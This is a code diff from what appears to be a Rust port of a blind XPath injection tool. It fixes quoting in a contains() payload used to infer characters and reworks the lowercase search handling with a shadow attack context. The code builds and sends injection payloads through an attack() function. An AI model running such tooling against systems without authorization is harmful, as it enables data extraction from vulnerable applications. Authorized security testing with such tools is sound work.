@@ -83,7 +83,7 @@ pub fn xml_optimize_character_set_node(
         let cmd = if c == '\'' {
             format!(r#"contains({},"'")"#, node)
         } else {
-            format!("contains({},'{}'')", node, c)
+            format!("contains({},'{}')", node, c)
         };
         if attack(&encode_payload(&cmd, &ctx.config), ctx) {
             present.push(c);
@@ -345,16 +345,34 @@ pub fn xml_search(search_str: &str, ctx: &Arc<AttackCtx>) {
         "contains"
     };
 
-    // Build the quoted search string, lowercasing if requested
-    let (str_arg, name_node, node_expr) = if config.use_lowercase {
+    // Build the quoted search string, lowercasing if requested.
+    // Mirror Python's behaviour of setting use_lowercase=False after embedding translate()
+    // into the XPath expressions, so that to_lower() in get_character_bst doesn't
+    // double-wrap them.
+    let (str_arg, name_node, node_expr, ctx_ref);
+    let lowercase_ctx: Arc<AttackCtx>;
+    let ctx = if config.use_lowercase {
         let lower = format!("'{}'", search_str.to_lowercase());
         println!("# Converting search string to lowercase {} #", lower);
         let nn = r#"translate(name(),"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz")"#;
         let ne = r#"translate(.,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz")"#;
-        (lower, nn.to_string(), ne.to_string())
+        str_arg = lower;
+        name_node = nn.to_string();
+        node_expr = ne.to_string();
+        // Build a shadow ctx with use_lowercase disabled so to_lower() is a no-op
+        lowercase_ctx = Arc::new(AttackCtx {
+            config: Config { use_lowercase: false, ..ctx.config.clone() },
+            request_count: std::sync::atomic::AtomicU64::new(0),
+            thread_tx: None,
+            result_rx: None,
+        });
+        ctx_ref = &lowercase_ctx;
+        ctx_ref
     } else {
-        let s = format!("'{}'", search_str);
-        (s, "name(.)".to_string(), ".".to_string())
+        str_arg = format!("'{}'", search_str);
+        name_node = "name(.)".to_string();
+        node_expr = ".".to_string();
+        ctx
     };
 
     if !config.no_child {
